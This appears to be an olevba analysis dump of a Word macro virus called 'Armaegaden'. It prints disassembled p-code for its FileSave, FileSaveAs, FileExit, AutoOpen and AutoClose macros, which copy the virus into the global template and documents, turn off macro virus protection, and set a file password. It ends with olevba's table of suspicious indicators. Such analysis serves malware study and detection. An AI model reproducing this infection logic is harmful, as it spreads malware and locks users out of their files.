' Line #33:
' Line #34:
' 	EndSub 
' Macros/VBA/FileExit - 2666 bytes
' Line #0:
' 	FuncDefn (Sub FileExit())
' Line #1:
' Line #2:
' 	OnError ErrorInfectGlobalTemplateE 
' Line #3:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd countmacros 0x0001 
' 	For 
' Line #4:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd macroname 0x0002 
' 	LitStr 0x000A "Armaegaden"
' 	Eq 
' 	IfBlock 
' Line #5:
' 	LitDI2 0x0009 
' 	St checkinfected 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #8:
' 	Ld checkinfected 
' 	LitDI2 0x0009 
' 	Ne 
' 	IfBlock 
' Line #9:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":Armaegaden"
' 	Add 
' 	LitStr 0x000A "Armaegaden"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #10:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitStr 0x000A "ToolsMacro"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #11:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0008 "AutoOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #12:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitStr 0x0009 "AutoClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #13:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x0008 "AutoExec"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #14:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitStr 0x0009 "FileClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #15:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0008 ":FileNew"
' 	Add 
' 	LitStr 0x0007 "FileNew"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #16:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileExit"
' 	Add 
' 	LitStr 0x0008 "FileExit"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #17:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitStr 0x0008 "FileSave"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #18:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x000A "FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #21:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #23:
' 	EndWith 
' Line #24:
' 	Ld Template 
' 	ArgsMemCall Save 0x0000 
' Line #25:
' 	Label ErrorInfectGlobalTemplateE 
' Line #26:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #29:
' 	EndWith 
' Line #30:
' 	Ld Armaegaden 
' 	ArgsMemCall (Call) Armaegaden 0x0000 
' Line #31:
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #33:
' Line #34:
' 	EndSub 
' Macros/VBA/FileSave - 4811 bytes
' Line #0:
' 	FuncDefn (Sub FileSave())
' Line #1:
' 	OnError ErrorInfectFS 
' Line #2:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LitStr 0x000A "Armaegaden"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":Armaegaden"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #4:
' 	LitStr 0x000A "ToolsMacro"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #5:
' 	LitStr 0x0009 "FileClose"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #6:
' 	LitStr 0x0007 "FileNew"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0008 ":FileNew"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #7:
' 	LitStr 0x0008 "FileExit"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileExit"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #8:
' 	LitStr 0x0008 "FileSave"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #9:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #10:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #11:
' 	LitStr 0x0009 "AutoClose"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #12:
' 	LitStr 0x0008 "AutoExec"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #13:
' 	QuoteRem 0x0004 0x0098 "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems"
' Line #14:
' 	QuoteRem 0x0004 0x0099 "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoClose", Object:=wdOrganizerObjectProjectItems"
' Line #15:
' 	QuoteRem 0x0004 0x0098 "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoExec", Object:=wdOrganizerObjectProjectItems"
' Line #16:
' 	QuoteRem 0x0004 0x0098 "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileExit", Object:=wdOrganizerObjectProjectItems"
' Line #17:
' 	QuoteRem 0x0004 0x009A "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileSaveAs", Object:=wdOrganizerObjectProjectItems"
' Line #18:
' 	QuoteRem 0x0004 0x0099 "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileClose", Object:=wdOrganizerObjectProjectItems"
' Line #19:
' 	QuoteRem 0x0004 0x0098 "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileSave", Object:=wdOrganizerObjectProjectItems"
' Line #20:
' 	QuoteRem 0x0004 0x0097 "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileNew", Object:=wdOrganizerObjectProjectItems"
' Line #21:
' 	QuoteRem 0x0004 0x009A "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ToolsMacro", Object:=wdOrganizerObjectProjectItems"
' Line #22:
' 	QuoteRem 0x0004 0x009A "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Armaegaden", Object:=wdOrganizerObjectProjectItems"
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Label ErrorInfectFS 
' Line #25:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #28:
' 	EndWith 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	Ld Armaegaden 
' 	ArgsMemCall (Call) Armaegaden 0x0000 
' Line #31:
' Line #32:
' Line #33:
' 	EndSub 
' Macros/VBA/FileSaveAs - 2655 bytes
' Line #0:
' 	FuncDefn (Sub FileSaveAs())
' Line #1:
' Line #2:
' 	OnError ErrorInfectFSA 
' Line #3:
' 	SetStmt 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	Set dlg 
' Line #4:
' 	Ld dlg 
' 	ArgsMemCall Update 0x0000 
' Line #5:
' 	Ld dlg 
' 	ArgsMemCall Show 0x0000 
' Line #6:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #7:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #8:
' 	LitStr 0x000A "Armaegaden"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":Armaegaden"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #9:
' 	LitStr 0x000A "ToolsMacro"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #10:
' 	LitStr 0x0009 "FileClose"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #11:
' 	LitStr 0x0007 "FileNew"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0008 ":FileNew"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #12:
' 	LitStr 0x0008 "FileExit"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileExit"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #13:
' 	LitStr 0x0008 "FileSave"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #14:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #15:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #16:
' 	LitStr 0x0009 "AutoClose"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #17:
' 	LitStr 0x0008 "AutoExec"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Label ErrorInfectFSA 
' Line #22:
' 	Ld dlg 
' 	MemLd Password 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #23:
' 	LitStr 0x000A "Armaegaden"
' 	Ld dlg 
' 	MemSt Password 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #28:
' 	EndWith 
' Line #29:
' 	Ld dlg 
' 	ArgsMemCall Update 0x0000 
' Line #30:
' 	Ld Armaegaden 
' 	ArgsMemCall (Call) Armaegaden 0x0000 
' Line #31:
' Line #32:
' 	EndSub 
' Line #33:
' Macros/VBA/AutoOpen - 2552 bytes
' Line #0:
' 	FuncDefn (Sub MAIN())
' Line #1:
' Line #2:
' 	OnError ErrorInfectGlobalTemplate 
' Line #3:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd countmacros 0x0001 
' 	For 
' Line #4:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd macroname 0x0002 
' 	LitStr 0x000A "Armaegaden"
' 	Eq 
' 	IfBlock 
' Line #5:
' 	LitDI2 0x0009 
' 	St checkinfected 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #8:
' 	Ld checkinfected 
' 	LitDI2 0x0009 
' 	Ne 
' 	IfBlock 
' Line #9:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":Armaegaden"
' 	Add 
' 	LitStr 0x000A "Armaegaden"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #10:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitStr 0x000A "ToolsMacro"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #11:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0008 "AutoOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #12:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitStr 0x0009 "AutoClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #13:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x0008 "AutoExec"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #14:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitStr 0x0009 "FileClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #15:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0008 ":FileNew"
' 	Add 
' 	LitStr 0x0007 "FileNew"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #16:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileExit"
' 	Add 
' 	LitStr 0x0008 "FileExit"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #17:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitStr 0x0008 "FileSave"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #18:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x000A "FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #21:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #23:
' 	EndWith 
' Line #24:
' 	Ld Template 
' 	ArgsMemCall Save 0x0000 
' Line #25:
' 	Label ErrorInfectGlobalTemplate 
' Line #26:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #29:
' 	EndWith 
' Line #30:
' 	Ld Armaegaden 
' 	ArgsMemCall (Call) Armaegaden 0x0000 
' Line #31:
' 	EndSub 
' Macros/VBA/AutoClose - 2588 bytes
' Line #0:
' 	FuncDefn (Sub MAIN())
' Line #1:
' Line #2:
' 	OnError ErrorInfectGlobalTemplateC 
' Line #3:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd countmacros 0x0001 
' 	For 
' Line #4:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd macroname 0x0002 
' 	LitStr 0x000A "Armaegaden"
' 	Eq 
' 	IfBlock 
' Line #5:
' 	LitDI2 0x0009 
' 	St checkinfected 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #8:
' 	Ld checkinfected 
' 	LitDI2 0x0009 
' 	Ne 
' 	IfBlock 
' Line #9:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":Armaegaden"
' 	Add 
' 	LitStr 0x000A "Armaegaden"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #10:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitStr 0x000A "ToolsMacro"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #11:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0008 "AutoOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #12:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitStr 0x0009 "AutoClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #13:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x0008 "AutoExec"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #14:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitStr 0x0009 "FileClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #15:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0008 ":FileNew"
' 	Add 
' 	LitStr 0x0007 "FileNew"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #16:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileExit"
' 	Add 
' 	LitStr 0x0008 "FileExit"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #17:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitStr 0x0008 "FileSave"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #18:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x000A "FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #21:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #23:
' 	EndWith 
' Line #24:
' 	Ld Template 
' 	ArgsMemCall Save 0x0000 
' Line #25:
' 	Label ErrorInfectGlobalTemplateC 
' Line #26:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #29:
' 	EndWith 
' Line #30:
' 	Ld Armaegaden 
' 	ArgsMemCall (Call) Armaegaden 0x0000 
' Line #31:
' Line #32:
' 	EndSub 
' Macros/VBA/AutoExec - 1014 bytes
' Line #0:
' 	FuncDefn (Sub MAIN())
' Line #1:
' Line #2:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

